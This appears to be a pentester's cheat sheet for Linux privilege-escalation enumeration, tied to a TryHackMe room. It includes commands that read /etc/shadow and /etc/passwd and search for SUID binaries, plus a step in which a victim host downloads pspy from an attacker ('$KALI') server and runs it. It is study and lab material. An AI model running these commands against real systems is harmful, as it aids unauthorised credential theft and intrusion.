# Linux



**Gathering Info**

```
whoami
```

```
uname -a
```

```
cat /etc/passwd
cat /etc/shadow
```

```
cat /etc/crontab
```

**Files with SUID-bit set**

```
find / -perm -u=s -type f 2> /dev/null 
```

**Files where group permissions equal to "writable"**

```
find /etc -type f -perm /g=w -exec ls -l {} + 2> /dev/null 
```

```
ps aux | grep -v "\[" | grep root
```

```
dpkg -l # debian
```

```
rpm -qa # red hat
```

```
pacman -Qe # arch linux
```

**Look at open ports**

```
ss -ltp
```

## PSPY

script that can monitor linux processes without root access

**Kali**

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 
python2 -m SimpleHTTPServer 81
```

**Victim**

```
wget http://$KALI:81/pspy32 
chmod +x pspy32 
./pspy32 
```





Copy Material from here:

[https://tryhackme.com/room/linprivesc](https://tryhackme.com/room/linprivesc)



**Automated Enumeration Tools**

| Name                          | Link                                                                                                                                                                                           |
| ----------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| LinPeas                       | [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) |
| LinEnum                       | [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)                                                                                                                 |
| LES (Linux Exploit Suggester) | [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)                                                                                           |
| Linux Smart Enumeration       | [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)                                                                           |
| Linux Priv Checker:           | [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)                                                                                                       |



